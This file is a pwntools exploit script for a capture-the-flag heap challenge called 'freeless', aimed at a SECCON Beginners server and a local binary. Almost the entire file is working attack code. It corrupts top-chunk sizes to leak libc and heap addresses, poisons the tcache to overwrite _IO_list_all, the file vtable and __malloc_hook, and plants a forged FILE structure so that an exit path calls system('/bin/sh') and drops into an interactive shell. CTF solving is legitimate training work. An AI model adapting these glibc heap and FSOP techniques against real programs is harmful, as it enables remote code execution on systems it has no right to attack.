#!/usr/bin/python3
from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "freeless.quals.beginners.seccon.jp"
PORT = 9077
"""
HOST = "localhost"
PORT = 7777
"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)

libc = ELF('./libc-2.31.so')
off_unsorted = libc.symbols["__malloc_hook"] + 0x70
off_malloc_hook = libc.symbols["__malloc_hook"]
off_io_list = libc.symbols["_IO_list_all"]
off_vtable = libc.symbols["_IO_file_jumps"]
off_system = libc.symbols["system"]
off_exit = libc.symbols["exit"]

def create(idx, size):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter(": ", str(idx))
	conn.sendlineafter(": ", str(size-0x8))

def edit(idx, data):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter(": ", str(idx))
	conn.sendlineafter(": ", data)

def show(idx):
	conn.sendlineafter("> ", "3")
	conn.sendlineafter(": ", str(idx))
	conn.recvuntil("data: ")

def exploit():
	payload = b"A"*0x18
	payload += p64(0x71)
	
	create(0, 0xd00-0x20) 
	create(1, 0x20)		  
	edit(1, payload)			# overwrite top size
	
	create(2, 0x1000-0x20-0x70) 
	create(3, 0x20)
	edit(3, payload)			# overwrite top size

	payload = b"A"*0x18
	payload += p64(0x51)
	
	payload = b"A"*0x18
	payload += p64(0x441)
	create(4, 0x1000-0x20-0x440)
	create(5, 0x20)
	edit(5, payload)
	
	create(6, 0x1000)
	leak_padding = b"A"*0x1f + b"X"
	edit(5, leak_padding)
	show(5)
	conn.recvuntil("AX")
	libc_unsorted = u64(conn.recv(6)+b"\x00\x00")
	libc_base = libc_unsorted - off_unsorted
	libc_io_list = libc_base + off_io_list
	libc_vtable = libc_base + off_vtable
	libc_system = libc_base + off_system
	libc_malloc_hook = libc_base + off_malloc_hook
	libc_exit = libc_base + off_exit

	payload = b"A"*0x18+p64(0x421)
	edit(5, payload)

	edit(3, leak_padding)
	show(3)
	conn.recvuntil("AX")
	heap_addr = conn.recvline()[:-1]
	heap_base = u64(heap_addr + b"\x00"*(8-len(heap_addr))) -0x290-(0xd00-0x20)-0x20-0x10
	
	edit(3, b"A"*0x20+p64(heap_base+0x10))
	create(7, 0x50)
	create(8, 0x50)
	fake_tcache_struct = b"\x07\x00"*0x40
	fake_tcache_struct += p64(libc_io_list)
	fake_tcache_struct += p64(libc_vtable)
	fake_tcache_struct += p64(libc_malloc_hook)
	edit(8, fake_tcache_struct)
	create(9, 0x20)
	edit(9, p64(heap_base+0x290+0x10))
	create(10, 0x30)
	edit(10, p64(0)+p64(libc_system))
	create(11, 0x40)
	edit(11, p64(libc_exit))

	fake_file = file_plus_struct()	
	fake_file._flags = u64("/bin/sh\x00")
	fake_file._IO_write_ptr = 1
	fake_file._IO_write_base = 0
	fake_file._vtable = libc_vtable-0x10
	edit(0, fake_file.get_payload())
	
	create(15, 0x100) 			# call malloc() -> exit()
	
	print(hex(libc_base))
	print(hex(heap_base))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
